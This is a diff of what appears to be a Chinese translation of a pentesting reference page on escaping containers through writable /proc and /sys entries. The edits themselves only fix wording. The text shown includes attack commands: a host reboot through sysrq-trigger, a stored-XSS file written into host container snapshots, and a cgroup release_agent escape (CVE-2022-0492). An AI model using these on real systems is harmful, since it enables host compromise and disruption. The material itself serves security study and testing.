@@ -16,7 +16,7 @@
 
 - 在 [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) 中描述。
 - 如果您可以写入此文件，则可以写入一个管道 `|`，后跟将在崩溃发生后执行的程序或脚本的路径。
-- 攻击者可以通过执行 `mount` 找到主机中其容器的路径，并将路径写入其容器文件系统中的二进制文件。然后，崩溃一个程序以使内核在容器外执行该二进制文件。
+- 攻击者可以通过执行 `mount` 找到主机内的路径，并将路径写入其容器文件系统中的二进制文件。然后，崩溃一个程序以使内核在容器外执行该二进制文件。
 
 - **测试和利用示例**：
 ```bash
@@ -59,18 +59,18 @@ ls -l $(cat /proc/sys/kernel/modprobe) # 检查对 modprobe 的访问
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- 允许根据其魔数注册非本地二进制格式的解释器。
+- 允许根据其魔术数字注册非本地二进制格式的解释器。
 - 如果 `/proc/sys/fs/binfmt_misc/register` 可写，可能导致特权升级或 root shell 访问。
 - 相关漏洞和解释：
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - 深入教程：[视频链接](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### 其他在 `/proc` 中
+### 其他 `/proc` 中的内容
 
 #### **`/proc/config.gz`**
 
 - 如果启用了 `CONFIG_IKCONFIG_PROC`，可能会揭示内核配置。
-- 对攻击者识别正在运行的内核中的漏洞非常有用。
+- 对攻击者识别运行内核中的漏洞非常有用。
 
 #### **`/proc/sysrq-trigger`**
 
@@ -84,12 +84,12 @@ echo b > /proc/sysrq-trigger # 重启主机
 #### **`/proc/kmsg`**
 
 - 暴露内核环形缓冲区消息。
-- 可以帮助进行内核漏洞利用、地址泄漏，并提供敏感系统信息。
+- 可以帮助内核漏洞利用、地址泄漏，并提供敏感系统信息。
 
 #### **`/proc/kallsyms`**
 
 - 列出内核导出符号及其地址。
-- 对于内核漏洞开发至关重要，特别是克服 KASLR。
+- 对于内核漏洞开发至关重要，尤其是克服 KASLR。
 - 地址信息在 `kptr_restrict` 设置为 `1` 或 `2` 时受到限制。
 - 详细信息见 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。
 
@@ -124,7 +124,7 @@ echo b > /proc/sysrq-trigger # 重启主机
 #### **`/proc/[pid]/mountinfo`**
 
 - 提供有关进程挂载命名空间中挂载点的信息。
-- 暴露容器 `rootfs` 或镜像的位置。
+- 暴露容器 `rootfs` 或映像的位置。
 
 ### `/sys` 漏洞
 
@@ -132,7 +132,7 @@ echo b > /proc/sysrq-trigger # 重启主机
 
 - 用于处理内核设备 `uevents`。
 - 写入 `/sys/kernel/uevent_helper` 可以在 `uevent` 触发时执行任意脚本。
-- **漏洞利用示例**：
+- **利用示例**：
 ```bash
 
 #### Creates a payload
@@ -231,8 +231,7 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
 
-/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
-are/nginx/html/index2.html
+/ # echo '<!DOCTYPE html><html lang="zh"><head><script>alert("存储的 XSS！")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
 ```
 
 The XSS was achieved:
@@ -273,10 +272,10 @@ So the filesystems are under `/var/lib/docker/overlay2/`:
 ```bash
 $ sudo ls -la /var/lib/docker/overlay2
 
-drwx--x---  4 root root  4096 1月  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
-drwx--x---  4 root root  4096 1月 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
-drwx--x---  4 root root  4096 1月  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
-drwx--x---  4 root root  4096 1月  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
+drwx--x---  4 root root  4096 1月  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
+drwx--x---  4 root root  4096 1月 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
+drwx--x---  4 root root  4096 1月  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
+drwx--x---  4 root root  4096 1月  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
 <SNIP>
 ```
 
@@ -315,7 +314,7 @@ A similar technique works with **crictl**, **podman** or the **kubelet** API onc
 Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
 
 ```bash
-# 假设容器具有 CAP_SYS_ADMIN 权限和一个易受攻击的内核
+# 假设容器具有 CAP_SYS_ADMIN 权限并且内核存在漏洞
 mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # 需要 CVE-2022-0492
